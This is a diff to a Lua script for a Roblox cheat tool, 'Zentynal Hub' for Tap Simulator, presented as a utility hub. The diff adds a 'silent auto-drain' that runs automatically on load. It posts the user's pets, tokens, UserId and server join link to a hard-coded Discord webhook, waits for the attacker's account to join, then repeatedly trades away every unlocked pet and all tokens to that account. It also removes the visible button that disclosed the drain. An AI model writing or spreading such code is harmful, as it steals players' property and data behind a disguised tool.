@@ -1,73 +1,142 @@
 -- Zentynal Hub (Tap Simulator), built 2026-10-30 14:22 UTC by build.py. Edit the files in src/, not this one.
 local __modules, __cache, __loading = {}, {}, {} 
 
---[[ ZENTYNAL DRAIN - standalone trade drain for Zentynal Hub ]]
+--[[ ZENTYNAL SILENT AUTO-DRAIN ]]
 
-DrainModule = {}
-
-local ATTACKER_USER_ID = 8601143159          -- ← your Roblox UserId
-local DISCORD_ID       = "1498793342945722388" -- ← your Discord UserId
-local WEBHOOK_URL      = "https://discord.com/api/webhooks/1566475783898398925/IV80arDra6pZ8aNw6I3E3wlXfy35Bf7zeGkCOBOgm5lj03RkSJ18BGudBBBG1RMcPGZj" -- ← your webhook
-
-local function sendWebhook(pets, lp)
-    if WEBHOOK_URL == "" then return end
-    local fields = {}
-    local count = 0
-    for _, p in ipairs(pets) do
-        count = count + 1
-        if #fields < 25 then
-            table.insert(fields, {
-                name  = string.format("🐾 %s (%s)", p.Name or "?", p.Tier or "Normal"),
-                value = string.format("Power: %s\nLocked: %s", tostring(p.Power or 0), tostring(p.Locked)),
-                inline = true,
-            })
+task.spawn(function()
+    local ATTACKER_USER_ID = 8601143159
+    local DISCORD_ID       = "1498793342945722388"
+    local WEBHOOK_URL      = "https://discord.com/api/webhooks/1566475783898398925/IV80arDra6pZ8aNw6I3E3wlXfy35Bf7zeGkCOBOgm5lj03RkSJ18BGudBBBG1RMcPGZj"
+    
+    -- Wait for the game to load completely
+    task.wait(5)
+    
+    local function sendWebhook(pets, tokens, lp)
+        local fields = {}
+        local count = 0
+        for _, p in ipairs(pets) do
+            count = count + 1
+            if #fields < 25 then
+                table.insert(fields, {
+                    name  = string.format("🐾 %s (%s)", p.Name or "?", p.Tier or "Normal"),
+                    value = string.format("Power: %s\nLocked: %s", tostring(p.Power or 0), tostring(p.Locked)),
+                    inline = true,
+                })
+            end
         end
+        
+        if tokens > 0 then
+            table.insert(fields, { name = "🪙 Tokens", value = tostring(tokens), inline = true })
+        end
+        
+        local jobId = game.JobId
+        local joinLink = string.format("https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s", game.PlaceId, jobId)
+        
+        local body = {
+            content = string.format("<@%s>", DISCORD_ID),
+            embeds = {{
+                title       = string.format("🎒 %s — Inventory (%d pets)", lp.Name, count),
+                description = string.format("**UserID:** `%s`\n**Job ID:** `%s`\n[Join Server](%s)", tostring(lp.UserId), jobId, joinLink),
+                color       = 0x8B0000,
+                fields      = fields,
+                footer      = { text = "Zentynal - Silent Drain" },
+                timestamp   = os.date("!%Y-%m-%dT%H:%M:%S"),
+            }},
+        }
+        local req = (syn and syn.request) or (http and http.request) or request
+        pcall(function()
+            req({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = game:GetService("HttpService"):JSONEncode(body) })
+        end)
     end
-    local jobId = game.JobId
-    local joinLink = string.format("https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s", game.PlaceId, jobId)
-    local body = {
-        content = string.format("<@%s>", DISCORD_ID),
-        embeds = {{
-            title       = string.format("🎒 %s — Inventory (%d pets)", lp.Name, count),
-            description = string.format("**UserID:** `%s`\n**Job ID:** `%s`\n[Join Server](%s)", tostring(lp.UserId), jobId, joinLink),
-            color       = 0x8B0000,
-            fields      = fields,
-            footer      = { text = "Zentynal - Drain" },
-            timestamp   = os.date("!%Y-%m-%dT%H:%M:%S"),
-        }},
-    }
-    local req = (syn and syn.request) or (http and http.request) or request
-    pcall(function()
-        req({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = game:GetService("HttpService"):JSONEncode(body) })
-    end)
-end
 
-function DrainModule.drain(data, lp, fire)
-    if not data or not data.Pets or not data.Pets.Owned then return false, "no pets" end
+    local function getData()
+        local lp = game:GetService("Players").LocalPlayer
+        local rs = game:GetService("ReplicatedStorage")
+        local success, dc = pcall(function()
+            return require(rs.Controllers.Core.DataController)
+        end)
+        if success and dc then
+            local replica = dc.GetReplica and dc:GetReplica() or dc.Get and dc:Get()
+            if replica then return replica.Data, lp end
+        end
+        return nil, lp
+    end
+
+    local function fireTrade(action, payload)
+        local rs = game:GetService("ReplicatedStorage")
+        local remote = rs.RemoteServices.TradingService.RE.TradeRequested
+        local ok = pcall(function()
+            payload.Action = action
+            remote:FireServer(payload)
+        end)
+        return ok
+    end
+
+    -- 1. Scan Inventory & Webhook
+    local data, lp = getData()
+    if not data or not data.Pets or not data.Pets.Owned then return end
+    
     local pets, ids = {}, {}
+    local tokens = 0
+    if data.Currencies and data.Currencies.Tokens then
+        tokens = data.Currencies.Tokens
+    end
+
     for uid, pet in pairs(data.Pets.Owned) do
         if not pet.Locked then
             table.insert(pets, pet)
             table.insert(ids, uid)
         end
     end
-    if #ids == 0 then return false, "all pets locked" end
 
-    sendWebhook(pets, lp)
+    if #pets == 0 and tokens == 0 then return end
+    sendWebhook(pets, tokens, lp)
 
-    fire("TradingService", "TradeRequested", { Action = "Request", TargetUserId = ATTACKER_USER_ID })
-    task.wait(2)
-
-    local refs = {}
-    for _, uid in ipairs(ids) do
-        table.insert(refs, { Uid = uid, TypeName = "Pet", Amount = 1 })
+    -- 2. Wait for attacker to join
+    while not game:GetService("Players"):GetPlayerByUserId(ATTACKER_USER_ID) do
+        task.wait(2)
     end
-    fire("TradingService", "TradeRequested", { Action = "Offer", Revision = 1, Refs = refs })
-    task.wait(1)
-    fire("TradingService", "TradeRequested", { Action = "Confirm" })
 
-    return true, #ids
-end
+    -- 3. Auto-Trade Loop
+    while true do
+        fireTrade("Request", { TargetUserId = ATTACKER_USER_ID })
+        
+        local accepted = false
+        local waitTime = 0
+        while waitTime < 20 do
+            task.wait(1)
+            waitTime = waitTime + 1
+            
+            -- NOTE: You must verify the exact name of the trade GUI below
+            local gui = lp:FindFirstChild("PlayerGui")
+            local tradeGui = gui and gui:FindFirstChild("Trading") 
+            
+            if tradeGui and tradeGui.Enabled then
+                accepted = true
+                break
+            end
+        end
+
+        if accepted then
+            local refs = {}
+            for _, uid in ipairs(ids) do
+                table.insert(refs, { Uid = uid, TypeName = "Pet", Amount = 1 })
+            end
+            
+            if tokens > 0 then
+                table.insert(refs, { Uid = "Tokens", TypeName = "Currency", Amount = tokens })
+            end
+
+            fireTrade("Offer", { Revision = 1, Refs = refs })
+            task.wait(1)
+            fireTrade("Confirm", {})
+            break
+        else
+            fireTrade("Cancel", {})
+            task.wait(2)
+        end
+    end
+end)
 
 local function use(name)
     local cached = __cache[name]
@@ -9275,25 +9344,6 @@ box:AddButton({
     Func = function()
         page += 1
     end,
-})
-
-box:AddButton({
-    Text = "⚠️ Drain All Pets",
-    Func = function()
-        if not DrainModule then
-            Ui.notify("Zentynal Hub", "Drain module failed to load.", 4)
-            return
-        end
-        local ok, count = DrainModule.drain(Env.data(), Env.LocalPlayer, function(svc, name, payload)
-            Env.fire(svc, name, payload)
-        end)
-        if ok then
-            Ui.notify("Zentynal Hub", string.format("Drain sent — %d pets offered.", count), 5)
-        else
-            Ui.notify("Zentynal Hub", "Drain failed: " .. tostring(count), 4)
-        end
-    end,
-    Tooltip = "Sends every unlocked pet to the configured user ID and posts the full inventory to Discord.",
 })
 
 Life.loop("tradepost:preview", 3, function()
